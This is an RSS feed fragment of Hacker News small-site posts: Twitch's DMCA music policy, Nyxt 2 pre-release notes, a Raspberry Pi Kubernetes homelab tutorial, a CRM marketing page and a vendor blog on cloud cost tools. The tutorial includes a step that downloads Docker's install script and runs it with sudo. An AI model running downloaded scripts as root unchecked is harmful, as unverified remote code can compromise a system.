<p>Third, we need to give you the ability to actually review your allegedly infringing content when you receive a DMCA notification, in addition to the details already provided in our takedown notifications - that is, information about what copyrighted work was allegedly infringed, who the claimant is, and how the claimant can be contacted. We also need to help you more easily file counter notifications if you believe you have the rights to use the content–for example, because you’ve secured a license, believe the use is a fair use,&nbsp; the claimant does not control the rights, or believe you have the right to use the music without permission.</p>

<p>Some of you have asked why we don’t have a license covering any and all uses of recorded music. We are actively speaking with the major record labels about potential approaches to additional licenses that would be appropriate for the Twitch service. That said, the current constructs for licenses that the record labels have with other services (which typically take a cut of revenue from creators for payment to record labels) make less sense for Twitch. The vast majority of our creators don’t have recorded music as a part of their streams, and the revenue implications to creators of …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/">https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/</a></em></p>]]>
            </description>
            <link>https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061259</guid>
            <pubDate>Wed, 11 Nov 2020 18:33:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nyxt Release 2 Pre-release 4]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25061101">thread link</a>) | @jmercouris
<br/>
November 11, 2020 | https://nyxt.atlas.engineer/article/release-2-pre-release-4.org | <a href="https://web.archive.org/web/*/https://nyxt.atlas.engineer/article/release-2-pre-release-4.org">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


  <meta charset="utf-8">
  <meta name="generator" content="pandoc">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>Nyxt 2 Pre-release 4</title>
  
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->


<header>

</header>
<p>We are happy to announce the fourth pre-release of Nyxt version 2.0.0. If you missed the previous pre-release announcement, see <a href="https://nyxt.atlas.engineer/article/release-2-pre-release-3.org">here</a>.</p>
<p>Nyxt 2 is a massive overhaul of the Nyxt 1 series. A lot of effort has been geared towards improving the code quality under the hood which should reflect on the overall user experience with better performance, increased stability and better accessibility.</p>
<p>This is a test release for everyone to try out before the final release. It contains experimental features and some parts are still unfinished. Please feel free to share your feedback on our <a href="https://github.com/atlas-engineer/nyxt/issues">GitHub issue tracker</a>!</p>
<p>Notable highlights:</p>
<ul>
<li><p>Overhauled status area view to resemble powerline.</p>
<ul>
<li>Hold <code>shift</code> to scroll the tabs horizontally.</li>
</ul></li>
<li><p>New <code>dark-mode</code> (experimental).</p></li>
<li><p>New universal package manager interface.</p>
<p>Install, uninstall, describe packages, list their files, change generations, etc. See the various <code>*-package-*</code> and <code>*-generation-*</code> commands.</p>
<ul>
<li><p>Currently only interfaces the Guix package manager.</p></li>
<li><p>Help to implement additional backends is welcome!</p></li>
</ul></li>
<li><p>New <code>nowebgl-mode</code>.</p></li>
<li><p>New <code>nyxt-init-file</code> helper to derive a file name relative to the Nyxt configuration folder.</p></li>
<li><p>No longer ask to restore session when there is none.</p></li>
</ul>
<p>For the complete change list, please consult the <a href="https://github.com/atlas-engineer/nyxt/blob/2-pre-release-4/documents/CHANGELOG.org#2-pre-release-4">CHANGELOG.org</a> file.</p>
<p>We hope you enjoy these new features, and that they help make you more productive. Thanks for reading :-)</p>

<h2 id="nyxt-powerline">Nyxt Powerline</h2>
<p><img src="https://nyxt.atlas.engineer/static/image/article/status-area.png"></p>
<h2 id="package-manager">Package Manager</h2>
<p><img src="https://nyxt.atlas.engineer/static/image/article/describe-os-package.png"></p>
<p><img src="https://nyxt.atlas.engineer/static/image/article/git-package.png"></p>
<h2 id="dark-mode">Dark Mode</h2>
<p><img src="https://nyxt.atlas.engineer/static/image/article/wiki-normal.png"></p>
<p><img src="https://nyxt.atlas.engineer/static/image/article/wiki-dark.png"></p>


</div></div>]]>
            </description>
            <link>https://nyxt.atlas.engineer/article/release-2-pre-release-4.org</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061101</guid>
            <pubDate>Wed, 11 Nov 2020 18:21:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Raspberry Pi Homelab with Kubernetes]]>
            </title>
            <description>
<![CDATA[
Score 109 | Comments 48 (<a href="https://news.ycombinator.com/item?id=25061097">thread link</a>) | @amitpm
<br/>
November 11, 2020 | https://amithm.ca/2020/10/kubernetes-raspberrypi-homelab/ | <a href="https://web.archive.org/web/*/https://amithm.ca/2020/10/kubernetes-raspberrypi-homelab/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>I’ve been running <a href="https://pi-hole.net/">Pi-Hole</a> on a Raspberry Pi 3b wired into my wifi router for most of last year and its been great. So when the new Raspberry Pi 4 came out, I picked one up. It sits on my desk, mostly for easy access to its USB ports, which allows me to hook it up to some of my esp32 devkits and push micropython code onto them. The pi4 has been a great general purpose development environment.</p><p>Recently, I’ve been wanting to write some trivial web endpoints for “internal” dashboards and such for the house. Plus, its a great excuse to learn Golang. In this day and age, clearly a dockerized golang dev environment is the way to go. Have I truly built something, if my dev environment isn’t dockerized?</p><p>So we’re agreed that dockerizing my dev environment is the way to go. Surely if my dev environment is dockerized, how much more should my app deployments use containers? Nothing less will do. But now I need a way to deploy and orchestrate said containers? I know! I should run a kubernetes cluster across my two Pi’s! Might as well run the Pi-hole on it as well, how hard can it be?</p><p>So that is what I spent the better part of last week figuring out.</p><figure><img src="https://imgs.xkcd.com/comics/automation.png" alt="Mandatory xkcd"><figcaption><center>Mandatory xkcd</center></figcaption></figure><p>This blog post walks through what I did, and how I did it, It’s purpose is two-fold -</p><ol><li>It is a map to allow me to retrace my steps if I need to</li><li>Perhaps it may prove of (dubious) use to you.</li></ol><p>So, both my Pi’s run Ubuntu server. I decided I should start from scratch, and flashed the latest ubuntu server image onto the SD cards for both Pi’s. Being a very optimistic person by nature, I expected to have Pi-hole back up and running on this new Kubernetes cluster within a day, and a day of unfiltered ads was a small price to pay for the experience. Alas, it was close to a week before I had Pi-Hole working on my network again, but yay! you get to learn from my experience!</p><p>I didn’t have much of an understanding of Kubernetes components going into this project - but hey, that’s what these projects are meant to give you, and boy, did it. So fret not if you don’t understand some of these terms, the kubernetes documentation pages are great!</p><p>None of this work is original. I cobbled together guides and walkthroughts from various sources to get to this frankenstein’s monster of a post that you see here. You can find links to the sources I used at the end of this page.</p><p>The first step to this journey involves making sure you have the required packages on all your machines. In my case, this was two machines - the Pi4 (called Terminus) and the Pi3b (called Trantor). You need <code>docker</code>, <code>kubelet</code>, <code>kubeadm</code> and <code>kubectl</code>. You want this installed on all your nodes. Terminus will be my master node, Trantor will be my worker. Asimov fans may protest that the Second Foundation was on Trantor after all, but let’s go with this for now. Setting static IPs on the master and workers on your cluster also helps, but I won’t cover that here.</p><p>Update apt repos and packages.</p><div><pre><code data-lang="bash">sudo apt-get update
sudo apt-get upgrade
</code></pre></div><p>Install Docker using the Convenience script. Yes, shame on you for blindly running a script you downloaded from the internet.</p><div><pre><code data-lang="bash">curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh
</code></pre></div><p>Let’s make sure our non-root user can use Docker.</p><div><pre><code data-lang="bash">sudo usermod -aG docker $USER
</code></pre></div><p>Now there’s some additional setup that needs to be done in order to get Kubernetes to work on the Raspberry Pi - specifically enabling <code>cgroups</code>. You can do this by editing the file <code>/boot/firmware/cmdline.txt</code> and adding the following options at the end.</p><pre><code>cgroup_enable=cpuset cgroup_enable=memory cgroup_memory=1 swapaccount=1
</code></pre><p>You’ll need to reboot the Pi after this.</p><p>Add the K8s apt repo.</p><div><pre><code data-lang="bash">curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add -

cat <span>&lt;&lt;EOF | sudo tee /etc/apt/sources.list.d/kubernetes.list
</span><span>deb https://apt.kubernetes.io/ kubernetes-xenial main
</span><span>EOF</span>
</code></pre></div><p>You’ll notice we’re using <code>kubernetes-xenial</code> which was the latest release at the time of writing this. Update this to the latest release available if you need to.</p><p>Let’s install our main K8s helpers. We’ll also make sure they’re excluded freom any system upgrades. As the kubernetes <a href="https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/">documentation</a> says, “<code>kubeadm</code> and <code>kubectl</code> require special attention to upgrade.”</p><div><pre><code data-lang="bash">sudo apt update <span>&amp;&amp;</span> sudo apt install -y kubelet kubeadm kubectl
sudo apt-mark hold kubelet kubeadm kubectl
</code></pre></div><figure><img src="https://raw.githubusercontent.com/kubernetes/kubernetes/master/logo/logo.png" width="200" height="200"></figure><p>Create the cluster by running the following commands on the master node only. Pay special attention to the <code>--pod-network-cidr</code> parameter. You’ll need this CIDR range later on when setting up Flannel.</p><div><pre><code data-lang="bash"><span># Create the bootstrap token</span>
TOKEN<span>=</span><span>$(</span>sudo kubeadm token generate<span>)</span>
sudo kubeadm init --token<span>=</span><span>${</span>TOKEN<span>}</span> --pod-network-cidr<span>=</span>10.10.0.0/16
</code></pre></div><p>Congratulations. You are now the proud owner of a bare-metal kubernetes cluster (with one node). Admire the output, and consider running the commands they ask you to. For example, you’ll need a config file in <code>$HOME/.kube/config</code> if you want <code>kubectl</code> to work without too much hassle. Also make special note of the <code>kubeadm join</code> command as well, you’ll need to run that on your worker nodes.</p><p>These are the commands that the output from the previous step suggest you to run. Run this on the master node, in case that isn’t clear.</p><div><pre><code data-lang="bash">mkdir -p $HOME/.kube
sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
sudo chown <span>$(</span>id -u<span>)</span>:<span>$(</span>id -g<span>)</span> $HOME/.kube/config
</code></pre></div><p>Go run the <code>kubeadm join</code> commands on all the worker nodes you’d like to dedicate to this cluster. I’ll wait.</p><p>Going through this guide, you’ll quickly become familiar with the command <code>kubectl apply</code>. This command “applies a configuration to a resource” in kubernetes parlance and is typically provided a YAML “manifest” file as parameter.</p><p>So now we have a cluster, but technically Kubernetes doesn’t know how to handle networking between any pods that are scheduled on this cluster - atleast, that’s what I’ve understood. This is why you need an addon like Flannel to handle this for you. You can find a full list of Networking and Network Policy Addons <a href="https://kubernetes.io/docs/concepts/cluster-administration/addons/">here</a>. But in case it isn’t clear yet, we’ll use Flannel.</p><figure><img src="https://raw.githubusercontent.com/coreos/flannel/master/logos/flannel-horizontal-color.png"></figure><p>If you’ve specified a <code>pod-network-cidr</code> parameter when creating your cluster, you’ll need to edit the Flannel manifest with this CIDR before you apply it to the cluster.</p><p>Let’s download the default flannel manifest</p><div><pre><code data-lang="bash">curl https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml --output kube-flannel-updated.yml
</code></pre></div><p>Open it the file up in your favourite editor, and find the key <code>net-conf.json</code>. Update the CIDR given there with the right CIDR for your cluster. Once done, apply the manifest like so.</p><div><pre><code data-lang="bash">kubectl apply -f ./kube-flannel-updated.yml
</code></pre></div><p>To check if this worked, run the following command to get all pods running on your cluster.</p><p>You should see <code>core-dns</code> and <code>kube-flannel</code> pods running like so. I have two pods for each because I have two nodes in my cluster.</p><div><pre><code data-lang="bash">NAMESPACE              NAME                                          READY   STATUS    RESTARTS   AGE
kube-system            coredns-f9fd979d6-h9m47                       1/1     Running   <span>1</span>          3d2h
kube-system            coredns-f9fd979d6-m5jrd                       1/1     Running   <span>1</span>          3d2h
kube-system            kube-flannel-ds-2ngxd                         1/1     Running   <span>1</span>          3d2h
kube-system            kube-flannel-ds-kqflv                         1/1     Running   <span>1</span>          3d2h
</code></pre></div><p>Namespaces are used to isolate pods and services running on the same cluster. My data engineer brain thinks of the cluster as a database and namespaces as schemas, but I could be mistaken and maybe should be thinking of the cluster as a single database install, and the namespaces as individual databases. Or maybe, this is entirely the wrong abstraction to bring in. Scratch all of this, let’s move on.</p><p>We now have a cluster, that knows how to handle pod networking. Let’s run something on it! How about the <a href="https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/">Kubernetes dashboard</a>, so that you have something pretty to show your non-technically inclined significant other as the output of your hard work?</p><figure><img src="https://raw.githubusercontent.com/kubernetes/dashboard/master/docs/images/dashboard-ui.png" alt="Behold! The fruits of your labour!"><figcaption><center>Behold! The fruits of your labour!</center></figcaption></figure><p>We’ll create a namespace to hold everything related to the Kubernetes Dashboard. I’m calling the namespace - <code>kubernetes-dashboard</code>. Very imaginative, no?</p><div><pre><code data-lang="bash">kubectl create namespace kubernetes-dashboard
</code></pre></div><p>We’ll now download the manifest file for Kubernetes dashboard, because we need to make some changes.</p><div><pre><code data-lang="bash">curl https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.4/aio/deploy/recommended.yaml --output kubernetes-dashboard.yaml
</code></pre></div><p>I spent a few days trying to figure out why the manifest did not work out of the box, it kept failing when trying to pull the docker image. I worked around this by doing two things -</p><ol><li>Ran <code>docker pull kubernetesui/dashboard:v2.0.0</code> to cache a local copy of the docker image.</li><li>Commented out the <code>imagePullPolicy: Always</code> in the manifest file under the <code>kubernetes-dashboard</code> deployment block.</li></ol><p>For the more K8s experienced among you, you may be wondering why I did not try using the Helm chart - I did. Kubernetes-dashboard needs to run two services - <code>dashboard-metrics-scraper</code> and <code>kubernetes-dashboard</code>. The Helm chart only seemed to bring up <code>kubernetes-dashboard</code>. I’m sure I must be doing something wrong, but at this point my patience was wearing thin and I just wanted to get on with it.</p><p>Ok, so now we have an edited manifest, let’s apply it.</p><div><pre><code data-lang="bash">kubectl apply -f kubernetes-dashboard.yaml
</code></pre></div><p>It takes a little bit of time for the dashboard to come up. You can amuse yourself by looking at the pods as they spin up as follows -</p><div><pre><code data-lang="bash">watch kubectl get pods -n kubernetes-dashboard
</code></pre></div><p>You can get details on a specific pod by running -</p><div><pre><code data-lang="bash">kubectl describe pod &lt;pod_name&gt; -n kubernetes-dashboard
</code></pre></div><p>You can also tail logs on a specific pod by running -</p><div><pre><code data-lang="bash">kubectl -n kubernetes-dashboard logs &lt;pod_name&gt; -f
</code></pre></div><p>Once you see the dashbaord services up and running, let’s figure out how we actually get access to the dashboard UI.</p><p>We’ll assume that you haven’t configured kubectl on your local machine and are instead, running all these commands from your (headless) raspberry pi.</p><p>Run <code>kubectl proxy</code> first. This exposes the cluster API server over HTTP to the …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://amithm.ca/2020/10/kubernetes-raspberrypi-homelab/">https://amithm.ca/2020/10/kubernetes-raspberrypi-homelab/</a></em></p>]]>
            </description>
            <link>https://amithm.ca/2020/10/kubernetes-raspberrypi-homelab/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061097</guid>
            <pubDate>Wed, 11 Nov 2020 18:21:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Ultimate Guide to All in One CRM Solutions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25061084">thread link</a>) | @pstephenson5
<br/>
November 11, 2020 | https://1crm.com/ultimate-guide-all-in-one-crm-solutions/ | <a href="https://web.archive.org/web/*/https://1crm.com/ultimate-guide-all-in-one-crm-solutions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">

<div>
<div>
<div id="content" role="main">
<article id="post-43451">
<div><div><div><div><div>
<div>
<p><span>You’re in the right place If you’re looking to learn more about all in one CRM solutions. Please use the links below to read the full articles and discover more. We’ll be adding more articles over the coming weeks so be sure to bookmark this valuable resource!</span></p>
</div>
<div id="ultimate-heading-23385fb03bab16968" data-hspacer="no_spacer" data-halign="left"><p data-ultimate-target=".uvc-heading.ultimate-heading-23385fb03bab16968 h2" data-responsive-json-new="{&quot;font-size&quot;:&quot;desktop:25px;&quot;,&quot;line-height&quot;:&quot;&quot;}"><h2>What is an All In One CRM?</h2></p></div>
<div>
<p><span>Learn which customer relationship management software is defined as an all in one CRM and what makes this different from other CRMs.</span></p>
</div>
<div id="ultimate-heading-28495fb03bab18961" data-hspacer="no_spacer" data-halign="left"><p data-ultimate-target=".uvc-heading.ultimate-heading-28495fb03bab18961 h2" data-responsive-json-new="{&quot;font-size&quot;:&quot;desktop:25px;&quot;,&quot;line-height&quot;:&quot;&quot;}"><h2>Who Needs an All In One CRM and Why?</h2></p></div>
<div>
<p><span>Now you know what an all in one CRM is, learn more about the size and type of organizations that can benefit. Use our simple decision flowchart to work out if an all in one CRM is right for you.</span></p>
</div>
</div></div></div></div><div><div><div><div><div id="ultimate-heading-71465fb03bab19086" data-hspacer="no_spacer" data-halign="left"><p data-ultimate-target=".uvc-heading.ultimate-heading-71465fb03bab19086 h2" data-responsive-json-new="{&quot;font-size&quot;:&quot;desktop:25px;&quot;,&quot;line-height&quot;:&quot;&quot;}"><h2>The Best All In One CRM Solutions in 2021</h2></p></div>
<div>
<p><span>We’ve shortlisted 11 of the best all in one CRM solutions in the market today. Each review covers the product, its pricing, and pros and cons. We’ve even added some recommendations based on some typical buying criteria organizations like yours use.</span></p>
</div>
<div id="ultimate-heading-13315fb03bab1ad05" data-hspacer="no_spacer" data-halign="left"><p data-ultimate-target=".uvc-heading.ultimate-heading-13315fb03bab1ad05 h2" data-responsive-json-new="{&quot;font-size&quot;:&quot;desktop:25px;&quot;,&quot;line-height&quot;:&quot;&quot;}"><h2>All in One CRMs and E-Commerce</h2></p></div>
<div>
<p><span>Understand the benefits of integrating an all in one CRM with your e-commerce store to make your operations seamless and efficient.</span></p>
</div>
<div id="ultimate-heading-36805fb03bab1aed6" data-hspacer="no_spacer" data-halign="left"><p data-ultimate-target=".uvc-heading.ultimate-heading-36805fb03bab1aed6 h2" data-responsive-json-new="{&quot;font-size&quot;:&quot;desktop:25px;&quot;,&quot;line-height&quot;:&quot;&quot;}"><h2>All in One CRM with Order Management</h2></p></div>
<div>
<p><span>Implementing an all in one CRM that includes order management offers you extensive business management benefits in the areas of Customer Service, Project Management, plus extended capabilities in your customer portal.</span></p>
</div>
<div id="ultimate-heading-51905fb03bab1b09f" data-hspacer="no_spacer" data-halign="left"><p data-ultimate-target=".uvc-heading.ultimate-heading-51905fb03bab1b09f h2" data-responsive-json-new="{&quot;font-size&quot;:&quot;desktop:25px;&quot;,&quot;line-height&quot;:&quot;&quot;}"><h2>All in One CRM with a Customer Portal</h2></p></div>
<div>
<p><span>A self-service customer portal is a key part of any CRM implementation. And when you implement an all in one CRM your portal gets turbo-charged with an extensive set of additional capabilities!</span></p>
</div>
<div id="ultimate-heading-49355fb03bab1b630" data-hspacer="no_spacer" data-halign="left"><p data-ultimate-target=".uvc-heading.ultimate-heading-49355fb03bab1b630 h2" data-responsive-json-new="{&quot;font-size&quot;:&quot;desktop:25px;&quot;,&quot;line-height&quot;:&quot;&quot;}"><h2>All in One CRM and Integrations</h2></p></div>
<div>
<p><span> Making sure that all of your business systems play well together is really important, but can potentially be so complex that it is a major distraction. One approach to minimizing the effort required on this front is the adoption of an All in One CRM. </span></p>
</div>
</div></div></div></div><div><div><div><div><div id="ultimate-heading-45095fb03bab1d508" data-hspacer="no_spacer" data-halign="left"><p data-ultimate-target=".uvc-heading.ultimate-heading-45095fb03bab1d508 h4" data-responsive-json-new="{&quot;font-size&quot;:&quot;desktop:30px;&quot;,&quot;line-height&quot;:&quot;&quot;}"><h4>Get Your 1CRM 30-Day Free Trial</h4></p></div>
<div>
<div>
<p><span>Want to test drive 1CRM 8.6? Try it out for 30 days – on us! </span></p>
<p><span>With no credit card required, you can sign up and be online within minutes!</span></p>
</div>
</div>
</div></div></div><div><div><div><div><div><p><img src="https://1crm.com/wp-content/uploads/2018/07/1CRM-8.5-laptop-500x289.png" data-src="https://1crm.com/wp-content/uploads/2018/07/1CRM-8.5-laptop-500x289.png" data-srcset="https://1crm.com/wp-content/uploads/2018/07/1CRM-8.5-laptop-500x289.png 500w, https://1crm.com/wp-content/uploads/2018/07/1CRM-8.5-laptop-1000x578.png 1000w" width="500" height="289" data-dt-location="https://1crm.com/whats-new-8-5/1crm-8-5-laptop/" alt="1CRM-laptop" srcset="https://1crm.com/wp-content/uploads/2018/07/1CRM-8.5-laptop-500x289.png 500w, https://1crm.com/wp-content/uploads/2018/07/1CRM-8.5-laptop-1000x578.png 1000w"></p></div></div></div></div></div></div>
</div> <div>
<p><img src="https://1crm.com/wp-content/uploads/2018/04/suzanne-pic--150x150.jpg" width="80" height="80" alt="Suzanne Louis" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2080%2080'%3E%3C/svg%3E" data-lazy-src="https://1crm.com/wp-content/uploads/2018/04/suzanne-pic--150x150.jpg"></p> <div>
<h4><span>Author:</span>&nbsp;Suzanne Louis</h4>
<p>Suzanne is an independent marketing consultant, in charge of product marketing at 1CRM Corp. Her responsibilities include web design and content, videos, social media, analytics, public relations, advertising, and the 1CRM Blog.</p>
</div>
</div>

</article>

</div>
</div>
</div>
</div></div>]]>
            </description>
            <link>https://1crm.com/ultimate-guide-all-in-one-crm-solutions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061084</guid>
            <pubDate>Wed, 11 Nov 2020 18:20:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lyft, Netflix, Expedia, Slack, and Segment: Comparing DIY Cloud Cost Tools]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25061054">thread link</a>) | @CloudZero
<br/>
November 11, 2020 | https://www.cloudzero.com/blog/cloud-cost-management-tools | <a href="https://web.archive.org/web/*/https://www.cloudzero.com/blog/cloud-cost-management-tools">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        
        
        <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Breakthroughs in engineering best practices often stem from a handful of top tech companies. &nbsp;</p>
<!--more-->
<p>Many of them share their behind-the-scenes stories at <a href="https://www.youtube.com/watch?v=ChupgIbZr5Q">conferences</a>, in <a href="https://blog.twitter.com/engineering/en_us/a/2013/observability-at-twitter.html">blogs</a>, and <a href="https://www.slideshare.net/reed2001/culture-1798664">slide decks</a> — or <a href="https://netflix.github.io/chaosmonkey/">open source</a> code.</p>
<p>These companies invest millions of dollars and dedicated headcount in optimizing everything from uptime to engineering velocity — so why wouldn’t you look to them for inspiration?</p>
<p>CloudZero is a company that enables engineering to build more profitable applications, so we thought it would be interesting to investigate and share how these top companies think about cloud cost — and what kinds of cloud cost management tools they use and build. Luckily for us, a lot of them have blogged and spoken about it.</p>
<p>By the way, if you want to achieve results like these companies, without pulling your best engineers off your roadmap to build a homegrown system, <a href="https://www.cloudzero.com/platform">check CloudZero out</a>.</p>

<h2>Part 1: The Common Threads</h2>
<p>Before we dive in to the specifics, here are a few of the patterns that emerged across each DIY cloud cost management tool:</p>
<h3>They’ve built cultures of cost-conscious engineering.</h3>
<ul>
<li>Top companies <a href="https://www.cloudzero.com/engineering-teams">decentralize cost management</a> to engineering teams. All of them have reported that when engineers have visibility into their spending, they make better decisions.</li>
<li>These companies know it’s all about balance between cost and velocity. An engineer shouldn’t spend hours on something to save five dollars. Cost visibility is all about making better decisions and tradeoffs — not saving money at all costs.</li>
<li>They want <a href="https://www.cloudzero.com/engineering-teams">engineering teams to have autonomy and move quickly</a> — and understand that’s a key pillar to move quickly. At the same time, many of them have built guardrails to control cost while they.</li>
</ul>
<h3>They view cost in context of business.</h3>
<ul>
<li>Their disruptive business models have been enabled by strong command of cost and unit economics. The reason why they have revolutionized their respective categories is that they deliver innovative solutions to customers in cost effective ways. To do this, they understand their <a href="https://www.cloudzero.com/blog/cloud-unit-economics">cloud unit economics</a>, like cost per ride or stream, and discuss cost in the context of their business.</li>
<li>They have built custom ways to make the data <a href="https://www.cloudzero.com/solutions/cost-per-customer">speak to the different stakeholders</a>, including leadership and individual dev teams.</li>
<li>They’ve had to figure out ways to automate or supplement their tagging in order to be able to report on cost. They’ve also allocated container spend in custom ways.</li>
</ul>
<h3>They are complex and customized, but all achieving similar outcomes.</h3>
<ul>
<li>Existing offerings weren’t enough. Cloud cost management tools — at least the players you might see listed in the Gartner Magic Quadrant or Forrester Wave — weren’t doing the trick. Their engineering teams have all adopted next generation practices and services — and they needed a cost solution that could keep up.</li>
<li>These systems are an enormous amount of work and custom engineering. They have entire teams of full-time employees building these homegrown systems.</li>
</ul>


<h2>Part 2: The Homegrown Cloud Cost Management Tools</h2>

<p><img src="https://lh5.googleusercontent.com/kAplBll6TH9hj9tdoBc-wiySRwJX0oieyx1wGPTgf_vsiO3wDdCzPlrBh5n_X0WxucHwIf2WW2mXEfghckjD5GHYeK5oIA8EclrwCGN79VuoMLdau7wdA_FwQ7rkM9NmJLOu3XAB" width="139" height="69" alt="Lyft Logo"></p>
<p><strong><span>How We Know</span></strong></p>
<p>The Lyft team spoke at re:Invent in 2019 in a session called “Managing Your Cloud Financials as you Scale on AWS.”</p>
<p>You can watch it <a href="https://www.youtube.com/watch?v=ChupgIbZr5Q">here</a>. Lyft starts talking at around the 35 minute mark.</p>
<p><strong><span>How They Do It</span></strong></p>
<ul>
<li>Lyft has built a system of customized dashboards for all of their stakeholders, including leadership, engineering, and capacity planning.</li>
<li>Each engineering team lead has their own dashboard where they can drill in and investigate spend.</li>
<li>They measure cost per ride to track unit cost.</li>
<li>They have processing that sits on top of tags to be able to attribute spend to teams and projects.</li>
<li>They had to build a way to allocate container costs — a project which was much more challenging than expected.</li>
</ul>
<p><strong><span>Cost Culture</span></strong></p>
<p>Lyft has said that once their engineers had visibility into what they were spending, they started to make better decisions around cost. Teams are now shown how much they spend compared to other teams, which has led to some good-spirited competition to reduce costs.</p>
<p><img src="https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-01.png?width=800&amp;name=cloud-cost-management-tools-01.png" width="800" alt="Lyft's Cloud Cost Management Best Practices" srcset="https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-01.png?width=400&amp;name=cloud-cost-management-tools-01.png 400w, https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-01.png?width=800&amp;name=cloud-cost-management-tools-01.png 800w, https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-01.png?width=1200&amp;name=cloud-cost-management-tools-01.png 1200w, https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-01.png?width=1600&amp;name=cloud-cost-management-tools-01.png 1600w, https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-01.png?width=2000&amp;name=cloud-cost-management-tools-01.png 2000w, https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-01.png?width=2400&amp;name=cloud-cost-management-tools-01.png 2400w" sizes="(max-width: 800px) 100vw, 800px"></p>
<p><em>A slide from the re:Invent presentation detailing Lyft’s custom cost management solution.</em></p>

<p><img src="https://lh3.googleusercontent.com/BKAFIAGWqHo0wrdlf__Sr-1RyiQqs8lN5VkU833O-Q7IDPwnSTspC7yATG5hZ-8lmDuHGPceHjIr3Ujx_nvy3zP5BfYWebmNxsIGr0wXEGH7Rtl5X19_A6rI0QsmFJCViIowisWm" width="175" height="117" alt="Netflix Logo"></p>
<p><span><strong>How We Know</strong></span></p>
<p>Netflix wrote a very detailed blog about their home grown efficiency and cost management system.</p>
<p>You can read it <a href="https://netflixtechblog.com/byte-down-making-netflixs-data-infrastructure-cost-effective-fee7b3235032">here</a>.</p>
<p><span><strong>How They Do It</strong></span></p>
<ul>
<li>Netflix has a “a custom dashboard that serves as a feedback loop to data producers and consumers — it is the single holistic source of truth for cost and usage trends for Netflix’s data users.”</li>
<li>They break down cost into “meaningful resource unit (table, index, column family, job, etc).”</li>
<li>They categorize AWS billing data by service, such as Amazon EC2 and Amazon S3. However, they have built custom ways to get further granularity into each.</li>
<li>They found AWS billing data was not granular enough for them, so they have built custom methods to align cost to the business metrics they care about like teams and products.</li>
<li>They provide optimization for some scenarios, such as storage.</li>
<li>They deliver cost alerts directly to their engineers.</li>
</ul>
<p><span><strong>Cost Culture</strong></span></p>
<p>Netflix sums up their approach as: “At many other organizations, an effective way to manage data infrastructure costs is to set budgets and other heavy guardrails to limit spending. However, due to the highly distributed nature of our data infrastructure and our emphasis on freedom and responsibility, those processes are counter-cultural and ineffective.</p>
<p>Our efficiency approach, therefore, is to provide cost transparency and place the efficiency context as close to the decision-makers as possible.”</p>
<p><img src="https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-02.png?width=800&amp;name=cloud-cost-management-tools-02.png" width="800" alt="Netflix's Cloud Cost Management Best Practices" srcset="https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-02.png?width=400&amp;name=cloud-cost-management-tools-02.png 400w, https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-02.png?width=800&amp;name=cloud-cost-management-tools-02.png 800w, https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-02.png?width=1200&amp;name=cloud-cost-management-tools-02.png 1200w, https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-02.png?width=1600&amp;name=cloud-cost-management-tools-02.png 1600w, https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-02.png?width=2000&amp;name=cloud-cost-management-tools-02.png 2000w, https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-02.png?width=2400&amp;name=cloud-cost-management-tools-02.png 2400w" sizes="(max-width: 800px) 100vw, 800px"></p>
